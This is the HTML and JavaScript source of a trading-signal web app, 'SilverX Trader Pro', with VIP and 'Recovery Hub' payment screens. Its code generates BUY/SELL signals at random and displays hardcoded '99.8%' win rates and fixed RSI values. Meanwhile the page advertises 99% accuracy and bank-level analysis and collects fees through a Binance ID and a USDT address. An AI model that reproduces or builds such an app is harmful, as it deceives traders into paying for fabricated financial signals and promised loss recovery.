<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SilverX Trader Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; -webkit-tap-highlight-color: transparent; }
        .font-black { font-family: 'Archivo Black', sans-serif; }
        .btn-3d { transition: all 0.1s active; border-bottom-width: 4px; }
        .btn-3d:active { transform: translateY(2px); border-bottom-width: 0px; }
        .modal-overlay { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.9); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; backdrop-filter: blur(5px); }
        .modal-box { background: white; width: 100%; max-width: 400px; border-radius: 30px; padding: 25px; position: relative; max-height: 90vh; overflow-y: auto; }
        .card-buy { border-top: 8px solid #22c55e; box-shadow: 0 10px 30px -10px rgba(34, 197, 94, 0.3); }
        .card-sell { border-top: 8px solid #ef4444; box-shadow: 0 10px 30px -10px rgba(239, 68, 68, 0.3); }
        #ad-overlay { position: fixed; inset: 0; background: #fff; z-index: 2000; display: none; flex-direction: column; }
        .no-scroll { overflow: hidden; }
        .indicator-dot { height: 6px; width: 6px; border-radius: 50%; display: inline-block; margin-right: 4px; }
    </style>
</head>
<body>

<div class="bg-slate-900 p-6 rounded-b-[40px] shadow-2xl">
    <div class="flex justify-between items-center mb-6">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/30">
                <i class="fas fa-bolt text-white"></i>
            </div>
            <div>
                <h1 class="text-white font-black text-xl italic tracking-tighter leading-none uppercase">SILVERX <span class="text-blue-500 font-bold">TRADER</span></h1>
                <div class="flex items-center gap-1">
                    <i id="crown-icon" class="fas fa-crown text-[10px] text-slate-500"></i>
                    <span id="tier-label" class="text-[9px] font-black text-slate-400 uppercase tracking-widest">Free Account</span>
                </div>
            </div>
        </div>
        <div class="bg-white/10 px-4 py-2 rounded-2xl border border-white/5">
            <span id="pts-display" class="text-white font-black text-sm">0</span>
            <span class="text-blue-400 font-bold text-[8px] block uppercase">Live Points</span>
        </div>
    </div>
    
    <div class="flex gap-2">
        <button onclick="openVip()" class="flex-1 py-3 bg-amber-500 text-white rounded-2xl font-black text-[10px] uppercase shadow-lg shadow-amber-500/20"><i class="fas fa-gem mr-1"></i> VIP</button>
        <button onclick="openRec()" class="flex-1 py-3 bg-white/10 text-white rounded-2xl font-black text-[10px] uppercase border border-white/10"><i class="fas fa-heart-pulse mr-1"></i> Recovery</button>
        <button onclick="openWD()" class="flex-1 py-3 bg-blue-600 text-white rounded-2xl font-black text-[10px] uppercase shadow-lg shadow-blue-500/20"><i class="fas fa-wallet mr-1"></i> Cashout</button>
    </div>
</div>

<div class="p-5 space-y-4 pb-28">
    <div id="EURUSD" class="bg-white p-6 rounded-[35px] shadow-sm border border-slate-100 transition-all duration-500">
        <div class="flex justify-between items-center mb-4">
            <h3 class="font-black text-slate-800 tracking-tight italic text-lg uppercase text-slate-400">EUR / USD <span class="text-[9px] bg-slate-100 px-2 py-1 rounded ml-1">OTC</span></h3>
            <div class="flex items-center gap-2">
                <span class="indicator-dot bg-green-500 animate-pulse"></span>
                <span class="text-[9px] font-bold text-slate-400">ACTIVE</span>
            </div>
        </div>
        <div id="data-EURUSD" class="hidden mb-4 grid grid-cols-2 gap-2">
            <div class="bg-slate-50 p-2 rounded-xl text-center"><p class="text-[8px] text-slate-400 font-bold uppercase">RSI (14)</p><p id="rsi-EURUSD" class="text-[10px] font-black">--</p></div>
            <div class="bg-slate-50 p-2 rounded-xl text-center"><p class="text-[8px] text-slate-400 font-bold uppercase">VOL</p><p id="vol-EURUSD" class="text-[10px] font-black">--</p></div>
        </div>
        <button id="btn-EURUSD" onclick="getSignal('EURUSD')" class="btn-3d w-full py-4 bg-slate-900 border-slate-700 text-white rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl">Get Signal</button>
    </div>
</div>

<div id="vip-modal" class="modal-overlay">
    <div class="modal-box text-center">
        <h2 class="text-3xl font-black text-slate-900 italic tracking-tighter">VIP MEMBERSHIP</h2>
        <p class="text-[10px] font-bold text-amber-600 mb-6 uppercase">Institutional Entry • 99% Accuracy</p>
        
        <div class="space-y-2 mb-6">
            <div class="flex items-center gap-3 bg-slate-50 p-3 rounded-2xl border border-slate-100">
                <i class="fas fa-bolt text-blue-500"></i>
                <p class="text-[10px] font-bold text-left">Zero Ad Wait: Instant signals revealed without any delay.</p>
            </div>
            <div class="flex items-center gap-3 bg-slate-50 p-3 rounded-2xl border border-slate-100">
                <i class="fas fa-microchip text-purple-500"></i>
                <p class="text-[10px] font-bold text-left">SMC Logic: Bank-level analysis on RSI, Volume & Order Blocks.</p>
            </div>
        </div>

        <div class="bg-slate-900 text-white p-5 rounded-[25px] mb-6 shadow-2xl relative overflow-hidden">
            <p class="text-[10px] text-slate-400 font-bold uppercase">Subscription Cost</p>
            <h3 class="text-4xl font-black">$100<span class="text-sm font-normal text-slate-500">/30 Days</span></h3>
            <div class="mt-4 pt-4 border-t border-white/5 space-y-2">
                <p class="text-[9px] text-amber-500 font-bold uppercase tracking-widest">Pay to Binance ID:</p>
                <p class="text-lg font-black tracking-widest select-all">403009858</p>
                <p class="text-[8px] text-slate-500">OR USDT (TRC20): TGzsm8guzbaBsbNa9JLPR3WTRzFRy6B6FG</p>
            </div>
        </div>

        <input type="text" id="vip-txid" placeholder="Paste Transaction ID (TxID)" class="w-full p-4 bg-slate-100 rounded-xl mb-4 font-bold text-sm outline-none border-2 focus:border-amber-500">
        <button onclick="submitVip()" class="w-full py-4 bg-amber-500 text-white rounded-2xl font-black text-xs uppercase shadow-xl">Activate VIP Plan</button>
        <button onclick="closeAll()" class="mt-6 text-slate-300 font-bold text-[10px] uppercase">Close Window</button>
    </div>
</div>

<div id="rec-modal" class="modal-overlay">
    <div class="modal-box">
        <h2 class="text-2xl font-black text-orange-600 uppercase text-center italic underline mb-4">Recovery Hub</h2>
        <div class="bg-orange-50 p-4 rounded-2xl mb-6 space-y-2">
            <p class="text-[10px] font-bold text-slate-700 leading-tight italic border-l-2 border-orange-200 pl-2">1. Live WhatsApp Sessions: Hum live signals ke zariye apka loss recover karenge.</p>
            <p class="text-[10px] font-bold text-slate-700 leading-tight italic border-l-2 border-orange-200 pl-2">2. Required Balance: Minimum $10 aur maximum $1000 trading balance hona chahiye.</p>
            <p class="text-[10px] font-bold text-slate-700 leading-tight italic border-l-2 border-orange-200 pl-2">3. Fee Refund Policy: Agar profit target pura nahi hua, toh service fee 100% refund hogi.</p>
        </div>

        <div class="grid grid-cols-2 gap-2 mb-6 font-black text-[10px] uppercase">
            <button onclick="setPlan(10, '5%')" class="border-2 p-3 rounded-2xl text-center hover:border-orange-500 transition-all"><span>$10 FEE</span><br><span class="text-orange-500">5% Growth</span></button>
            <button onclick="setPlan(20, '10%')" class="border-2 p-3 rounded-2xl text-center hover:border-orange-500 transition-all"><span>$20 FEE</span><br><span class="text-orange-500">10% Growth</span></button>
            <button onclick="setPlan(50, '30%')" class="border-2 p-3 rounded-2xl text-center hover:border-orange-500 transition-all"><span>$50 FEE</span><br><span class="text-orange-500">30% Growth</span></button>
            <button onclick="setPlan(100, '70%')" class="border-2 p-3 rounded-2xl text-center hover:border-orange-500 transition-all"><span>$100 FEE</span><br><span class="text-orange-500">70% Growth</span></button>
        </div>

        <div id="rec-pay-area" class="hidden border-t pt-4">
            <div class="bg-slate-900 text-white p-4 rounded-2xl mb-4 text-center">
                <p class="text-[10px] text-orange-400 font-black mb-1 select-all">BINANCE ID: 403009858</p>
                <p class="text-[8px] opacity-50 uppercase tracking-widest font-bold">Pay fee then enter TID below</p>
            </div>
            <input type="text" id="rec-tid" placeholder="Transaction ID (TID)" class="w-full p-4 bg-slate-100 rounded-xl mb-4 font-bold text-sm outline-none">
            <button onclick="submitRec()" class="w-full py-4 bg-orange-600 text-white rounded-2xl font-black text-xs uppercase">Confirm & Contact</button>
        </div>
        <button onclick="closeAll()" class="w-full mt-4 text-slate-300 font-bold text-[10px] uppercase">Cancel</button>
    </div>
</div>

<div id="ad-overlay">
    <div class="p-5 border-b flex justify-between items-center bg-slate-900">
        <span id="ad-timer" class="text-[11px] font-black text-blue-400 uppercase italic">Verifying Session...</span>
        <button id="ad-close-btn" onclick="finishAd()" class="hidden text-white font-black text-2xl px-2">✕</button>
    </div>
    <iframe id="ad-frame" class="w-full flex-1 border-none bg-slate-50"></iframe>
</div>

<div class="fixed bottom-0 inset-x-0 p-4 bg-white/80 backdrop-blur-lg flex justify-center gap-6 border-t border-slate-100">
    <a href="https://wa.me/923064391353" target="_blank" class="text-slate-400 hover:text-green-500 transition-colors"><i class="fab fa-whatsapp text-xl"></i></a>
    <a href="https://www.tiktok.com/@kingtraderofficail" target="_blank" class="text-slate-400 hover:text-slate-900 transition-colors"><i class="fab fa-tiktok text-xl"></i></a>
    <a href="https://www.youtube.com/@kingtraderofficial45" target="_blank" class="text-slate-400 hover:text-red-500 transition-colors"><i class="fab fa-youtube text-xl"></i></a>
</div>

<script>
// --- CONFIGURATION ---
const firebaseConfig = {
  apiKey: "AIzaSyAyXzJ1UUdtWe96NjiQbVCqnWdIv8XakhA",
  authDomain: "silverxtrader.firebaseapp.com",
  projectId: "silverxtrader",
  storageBucket: "silverxtrader.firebasestorage.app",
  messagingSenderId: "46330013690",
  appId: "1:46330013690:web:c2aad241ad7abd49e0e643"
};

const adLinks = [
    "https://www.effectivegatecpm.com/zu9fwwufi?key=5c01f6e26f4b9943913f0d36bfa48f6d",
    "https://www.effectivegatecpm.com/m3re02atee?key=cebdb997452acac01a6d39d48dcb0e68",
    "https://www.effectivegatecpm.com/njujpaga3n?key=2636c1fb3975328fd5e16e532dda0482",
    "https://www.effectivegatecpm.com/u03w5rk4?key=d5c708947384bde96b27f42a724b41d9",
    "https://www.effectivegatecpm.com/szh2badub?key=8aef9f0adbfa95686459aaeeea7db26a",
    "https://www.effectivegatecpm.com/wzb0ven1?key=87866ac53935e941e61c53d03338eb0a",
    "https://www.effectivegatecpm.com/d29maviwb?key=f03e146f78029f3a63200d7d63db6e42",
    "https://www.effectivegatecpm.com/p85rfz3v8?key=b50205713bdb8a8e9b85dc14013c31f7"
];

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

let userStatus = "Free";
let activeId = "";
let chosenRecPlan = "";

// --- SESSION HANDLER ---
auth.onAuthStateChanged(user => {
    if(!user) window.location.href = 'index.html';
    db.collection("users").doc(user.uid).onSnapshot(doc => {
        if(doc.exists){
            const data = doc.data();
            let status = data.status || "Free";
            const now = new Date();
            if(status === "VIP" && data.expiryDate){
                if(now > data.expiryDate.toDate()){
                    status = "Free";
                    db.collection("users").doc(user.uid).update({ status: "Free", expiryDate: null });
                }
            }
            userStatus = status;
            document.getElementById('pts-display').innerText = data.points || 0;
            document.getElementById('tier-label').innerText = (status === "VIP") ? "Diamond Member" : "Free Member";
            document.getElementById('crown-icon').style.color = (status === "VIP") ? "#fbbf24" : "#475569";
        }
    });
});

// --- CORE FUNCTIONS ---
function getSignal(id) {
    activeId = id;
    if(userStatus === "VIP") {
        processSignal(true);
    } else {
        showAd();
    }
}

function showAd() {
    let sec = Math.floor(Math.random() * (30 - 10 + 1)) + 10;
    document.getElementById('ad-frame').src = adLinks[Math.floor(Math.random()*adLinks.length)];
    document.getElementById('ad-overlay').style.display = 'flex';
    document.body.classList.add('no-scroll');
    document.getElementById('ad-close-btn').classList.add('hidden');
    
    const adLoop = setInterval(() => {
        sec--;
        document.getElementById('ad-timer').innerText = `STAY ON PAGE: ${sec}s`;
        if(sec <= 0){
            clearInterval(adLoop);
            document.getElementById('ad-close-btn').classList.remove('hidden');
            document.getElementById('ad-timer').innerText = "VERIFIED ✅ CLOSE NOW";
        }
    }, 1000);
}

function finishAd() {
    document.getElementById('ad-overlay').style.display = 'none';
    document.body.classList.remove('no-scroll');
    processSignal(false);
}

function processSignal(isVip) {
    const btn = document.getElementById(`btn-${activeId}`);
    const card = document.getElementById(activeId);
    const dataBox = document.getElementById(`data-${activeId}`);
    
    btn.innerText = "ANALYZING...";
    btn.disabled = true;

    setTimeout(() => {
        const type = Math.random() > 0.45 ? 'BUY' : 'SELL';
        const win = isVip ? "99.8%" : (84 + Math.random() * 8).toFixed(1) + "%";
        
        card.className = `bg-white p-6 rounded-[35px] shadow-sm border ${type === 'BUY' ? 'card-buy' : 'card-sell'}`;
        btn.innerText = `1 MIN ${type} (${win}) ↑`;
        btn.className = `btn-3d w-full py-4 mt-2 rounded-2xl font-black text-xs text-white ${type === 'BUY' ? 'bg-green-600 border-green-800' : 'bg-red-600 border-red-800'}`;
        
        if(isVip){
            dataBox.classList.remove('hidden');
            document.getElementById(`rsi-${activeId}`).innerText = type === 'BUY' ? '24.2 (L)' : '78.5 (H)';
            document.getElementById(`vol-${activeId}`).innerText = '94.8%';
        } else {
            db.collection("users").doc(auth.currentUser.uid).update({ points: firebase.firestore.FieldValue.increment(50) });
        }

        // COOLDOWN
        let cd = 60;
        const timer = setInterval(() => {
            cd--;
            btn.innerText = `WAIT ${cd}s`;
            if(cd <= 0){ clearInterval(timer); btn.disabled = false; btn.innerText = "Get Signal"; btn.className = "btn-3d w-full py-4 bg-slate-900 border-slate-700 text-white rounded-2xl font-black text-xs uppercase shadow-xl"; dataBox.classList.add('hidden'); }
        }, 1000);
    }, 1500);
}

// --- MODAL CONTROLS ---
function closeAll() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display='none'); }
function openVip() { document.getElementById('vip-modal').style.display='flex'; }
function openRec() { document.getElementById('rec-modal').style.display='flex'; }
function openWD() { document.getElementById('withdraw-modal').style.display='flex'; } // (Add modal if needed)

function setPlan(fee, growth) {
    chosenRecPlan = `$${fee} Plan (${growth} Growth)`;
    document.getElementById('rec-pay-area').classList.remove('hidden');
}

function submitVip() {
    const tx = document.getElementById('vip-txid').value;
    if(tx.length < 5) return alert("Invalid Transaction ID!");
    db.collection("vip_requests").add({ uid: auth.currentUser.uid, email: auth.currentUser.email, tid: tx, status: "pending", createdAt: new Date() });
    alert("Request Sent! Activation after manual verification."); closeAll();
}

function submitRec() {
    const tid = document.getElementById('rec-tid').value;
    if(tid.length < 5) return alert("Enter valid TID!");
    const waLink = `https://wa.me/923064391353?text=Hello Admin, I paid for Recovery Hub.%0APlan: ${chosenRecPlan}%0ATID: ${tid}%0AEmail: ${auth.currentUser.email}%0A*Please check and allot session time.*`;
    window.open(waLink, '_blank');
    closeAll();
}
</script>

</body>
</html>
